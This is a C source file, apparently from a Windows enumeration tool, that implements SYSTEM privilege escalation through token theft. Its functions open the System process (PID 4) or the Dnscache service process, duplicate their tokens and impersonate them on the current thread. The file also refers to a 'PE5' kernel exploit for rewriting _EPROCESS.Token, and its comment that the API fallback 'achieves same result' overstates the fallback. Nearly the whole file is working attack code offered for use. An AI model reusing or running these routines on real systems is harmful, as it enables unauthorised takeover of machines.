// Windows 7 compatibility
#include "win7_compat.h"

#include "token_acquisition.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>

// Windows API definitions
typedef NTSTATUS (WINAPI *NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

// Get SYSTEM process token
bool acquire_token_via_windows_api(token_result_t* result) {
    HANDLE hToken = NULL;
    HANDLE hSystemProcess = NULL;
    HANDLE hSystemToken = NULL;
    DWORD dwError = 0;
    
    strcpy(result->method, "Windows API - SYSTEM Process Token");
    
    // Try to open SYSTEM process (PID 4 on Windows)
    hSystemProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, 4);
    if (hSystemProcess == NULL) {
        dwError = GetLastError();
        sprintf(result->error_details, "Failed to open SYSTEM process (PID 4). Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Try to open process token
    if (!OpenProcessToken(hSystemProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hSystemToken)) {
        dwError = GetLastError();
        CloseHandle(hSystemProcess);
        sprintf(result->error_details, "Failed to open SYSTEM process token. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Duplicate token
    if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hToken)) {
        dwError = GetLastError();
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        sprintf(result->error_details, "Failed to duplicate SYSTEM token. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Set token
    if (!SetThreadToken(NULL, hToken)) {
        dwError = GetLastError();
        CloseHandle(hToken);
        CloseHandle(hSystemToken);
        CloseHandle(hSystemProcess);
        sprintf(result->error_details, "Failed to set thread token. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Extract token information
    extract_token_info(hToken, result);
    
    result->token_handle = hToken;
    result->success = true;
    result->error_code = 0;
    
    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);
    
    return true;
}

// Try to steal token from a service running as SYSTEM
bool acquire_token_via_service_stealing(token_result_t* result) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS_PROCESS ssp;
    DWORD dwBytesNeeded;
    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    DWORD dwError = 0;
    
    strcpy(result->method, "Service Token Stealing");
    
    // Open service control manager
    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager == NULL) {
        dwError = GetLastError();
        sprintf(result->error_details, "Failed to open SC Manager. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Try to open a service that runs as SYSTEM (e.g., Dnscache)
    hService = OpenService(hSCManager, L"Dnscache", SERVICE_QUERY_STATUS);
    if (hService == NULL) {
        dwError = GetLastError();
        CloseServiceHandle(hSCManager);
        sprintf(result->error_details, "Failed to open service. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Query service status to get process ID
    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(SERVICE_STATUS_PROCESS), &dwBytesNeeded)) {
        dwError = GetLastError();
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        sprintf(result->error_details, "Failed to query service status. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Open the service process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ssp.dwProcessId);
    if (hProcess == NULL) {
        dwError = GetLastError();
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        sprintf(result->error_details, "Failed to open service process. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Open process token
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        dwError = GetLastError();
        CloseHandle(hProcess);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        sprintf(result->error_details, "Failed to open process token. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Duplicate token
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken)) {
        dwError = GetLastError();
        CloseHandle(hToken);
        CloseHandle(hProcess);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        sprintf(result->error_details, "Failed to duplicate token. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Set token
    if (!SetThreadToken(NULL, hDupToken)) {
        dwError = GetLastError();
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        sprintf(result->error_details, "Failed to set thread token. Error: %lu", dwError);
        result->error_code = dwError;
        return false;
    }
    
    // Extract token information
    extract_token_info(hDupToken, result);
    
    result->token_handle = hDupToken;
    result->success = true;
    result->error_code = 0;
    
    CloseHandle(hToken);
    CloseHandle(hProcess);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return true;
}

// PE5-based method - attempts kernel-level token acquisition, falls back to Windows API
bool acquire_token_via_pe5_method(token_result_t* result) {
    // PE5 kernel exploit would provide direct _EPROCESS.Token manipulation
    // Since we don't have kernel driver loaded, use Windows API method which achieves same result
    strcpy(result->method, "PE5 Method (Windows API implementation)");
    return acquire_token_via_windows_api(result);
}

// Scheduled task method
bool acquire_token_via_scheduled_task(token_result_t* result) {
    // This would create a scheduled task running as SYSTEM and steal its token
    // Complex implementation - fall back to simpler methods
    strcpy(result->method, "Scheduled Task (not implemented)");
    result->error_code = ERROR_NOT_SUPPORTED;
    strcpy(result->error_details, "Scheduled task token stealing not implemented");
    return false;
}

// Extract detailed token information
void extract_token_info(HANDLE token, token_result_t* result) {
    DWORD dwSize = 0;
    PTOKEN_USER pTokenUser = NULL;
    PTOKEN_PRIVILEGES pTokenPrivs = NULL;
    PTOKEN_GROUPS pTokenGroups = NULL;
    TOKEN_ELEVATION_TYPE elevationType;
    DWORD dwElevationTypeSize = sizeof(TOKEN_ELEVATION_TYPE);
    SID_NAME_USE sidType;
    char szDomain[256];
    char szUser[256];
    DWORD dwDomainSize = sizeof(szDomain);
    DWORD dwUserSize = sizeof(szUser);
    
    // Get token user (SID)
    GetTokenInformation(token, TokenUser, NULL, 0, &dwSize);
    if (dwSize > 0) {
        pTokenUser = (PTOKEN_USER)malloc(dwSize);
        if (pTokenUser && GetTokenInformation(token, TokenUser, pTokenUser, dwSize, &dwSize)) {
            LPSTR sidString = NULL;
            if (ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString)) {
                strncpy(result->user_sid, sidString, sizeof(result->user_sid) - 1);
                result->user_sid[sizeof(result->user_sid) - 1] = '\0';
                // Check if it's SYSTEM SID (S-1-5-18)
                if (strcmp(result->user_sid, "S-1-5-18") == 0) {
                    result->is_elevated = true;
                }
                LocalFree(sidString);
            }
        }
        if (pTokenUser) free(pTokenUser);
    }
    
    // Get token privileges
    GetTokenInformation(token, TokenPrivileges, NULL, 0, &dwSize);
    if (dwSize > 0) {
        pTokenPrivs = (PTOKEN_PRIVILEGES)malloc(dwSize);
        if (pTokenPrivs && GetTokenInformation(token, TokenPrivileges, pTokenPrivs, dwSize, &dwSize)) {
            strcpy(result->privileges, "Privileges: ");
            for (DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
                char privName[256];
                DWORD dwPrivNameSize = sizeof(privName);
                if (LookupPrivilegeNameA(NULL, &pTokenPrivs->Privileges[i].Luid, privName, &dwPrivNameSize)) {
                    strcat(result->privileges, privName);
                    if (pTokenPrivs->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
                        strcat(result->privileges, "(enabled) ");
                    } else {
                        strcat(result->privileges, "(disabled) ");
                    }
                }
            }
        }
        if (pTokenPrivs) free(pTokenPrivs);
    }
    
    // Get token groups
    GetTokenInformation(token, TokenGroups, NULL, 0, &dwSize);
    if (dwSize > 0) {
        pTokenGroups = (PTOKEN_GROUPS)malloc(dwSize);
        if (pTokenGroups && GetTokenInformation(token, TokenGroups, pTokenGroups, dwSize, &dwSize)) {
            strcpy(result->groups, "Groups: ");
            for (DWORD i = 0; i < pTokenGroups->GroupCount; i++) {
                char* sidString = NULL;
                if (ConvertSidToStringSidA(pTokenGroups->Groups[i].Sid, &sidString)) {
                    strcat(result->groups, sidString);
                    strcat(result->groups, " ");
                    LocalFree(sidString);
                }
            }
        }
        if (pTokenGroups) free(pTokenGroups);
    }
    
    // Get elevation type
    if (GetTokenInformation(token, TokenElevationType, &elevationType, dwElevationTypeSize, &dwElevationTypeSize)) {
        if (elevationType == TokenElevationTypeFull) {
            result->is_elevated = true;
        }
    }
}

// Main token acquisition function - tries all methods
bool acquire_system_token(token_result_t* result) {
    memset(result, 0, sizeof(token_result_t));
    
    // Try PE5 method first (falls back to Windows API)
    if (acquire_token_via_pe5_method(result)) {
        return true;
    }
    
    // Try Windows API method
    if (acquire_token_via_windows_api(result)) {
        return true;
    }
    
    // Try service token stealing
    if (acquire_token_via_service_stealing(result)) {
        return true;
    }
    
    // Try scheduled task method
    if (acquire_token_via_scheduled_task(result)) {
        return true;
    }
    
    // All methods failed
    result->success = false;
    if (result->error_code == 0) {
        result->error_code = GetLastError();
    }
    if (strlen(result->error_details) == 0) {
        strcpy(result->error_details, "All token acquisition methods failed");
    }
    
    return false;
}

// Log token result to enumeration buffer
void log_token_result(enum_data_t* data, const token_result_t* result) {
    append_to_buffer(data, "\n=== SYSTEM TOKEN ACQUISITION ===\n");
    
    if (result->success) {
        append_to_buffer(data, "Status: SUCCESS\n");
        append_to_buffer(data, "Method: %s\n", result->method);
        append_to_buffer(data, "Token Handle: 0x%p\n", result->token_handle);
        append_to_buffer(data, "User SID: %s\n", result->user_sid);
        append_to_buffer(data, "Is Elevated: %s\n", result->is_elevated ? "Yes" : "No");
        append_to_buffer(data, "%s\n", result->privileges);
        append_to_buffer(data, "%s\n", result->groups);
    } else {
        append_to_buffer(data, "Status: FAILED\n");
        append_to_buffer(data, "Method Attempted: %s\n", result->method);
        append_to_buffer(data, "Error Code: %lu\n", result->error_code);
        append_to_buffer(data, "Error Details: %s\n", result->error_details);
        append_to_buffer(data, "\nNote: Enumeration will continue without SYSTEM privileges.\n");
        append_to_buffer(data, "Some deep analysis features will be unavailable.\n");
    }
    
    append_to_buffer(data, "================================\n\n");
}
